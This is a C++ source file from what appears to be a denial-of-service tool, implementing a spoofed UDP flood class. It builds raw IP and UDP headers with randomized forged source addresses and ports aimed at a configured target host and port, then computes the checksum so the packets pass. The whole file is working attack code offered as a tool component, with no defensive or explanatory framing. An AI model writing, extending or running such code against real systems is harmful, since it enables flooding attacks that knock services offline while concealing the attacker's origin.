#include "spoofed_udp_flood.h"
#include "utils.h"

#include <cstring>

spoofed_udp_flood::spoofed_udp_flood(std::shared_ptr<Config> config) :
                                        base_spoofed_flood(std::move(config), IPPROTO_UDP) {

}

char *spoofed_udp_flood::gen_hdr(sockaddr_in *dst, int len) {
    char *string = new char[len];

    auto *ip = (iphdr *) string;
    auto *udp = (udphdr *)(string + sizeof(iphdr));
    std::string ipaddr{};
    bzero(string, (size_t) len);

    init_hdr(udp, ip);

    ip->daddr = dst->sin_addr.s_addr;

    if(config->rand_lhost){
        utils::randomizer::randomIP(ipaddr);
        ip->saddr = inet_addr(ipaddr.c_str());
    }else{
        ip->saddr = 0;
    }

    ip->tot_len = htons((uint16_t) len);

    if(config->rand_lport){
        udp->uh_sport = htons((uint16_t) utils::randomizer::randomPort());
    }else{
        udp->uh_sport = 0;
    }

    finalize_hdr(udp, ip);

    return string;
}

void spoofed_udp_flood::init_hdr(udphdr *udp, iphdr *ip) {
    ip->ihl = sizeof(struct iphdr) / 4;
    ip->version = 4;
    ip->tos = 16;
    ip->id = htons((uint16_t) utils::randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;

    udp->uh_dport = htons((uint16_t) utils::to_int(config->rport));
    udp->uh_ulen = htons(sizeof(struct udphdr));
}

void spoofed_udp_flood::finalize_hdr(udphdr *udp, iphdr *ip) {
    pshdr psh{};
    psh.saddr = ip->saddr;
    psh.daddr = ip->daddr;

    bcopy(udp, &psh.udp, sizeof(udphdr));

    udp->uh_sum = utils::csum((unsigned short *) &psh, sizeof(psh));
}
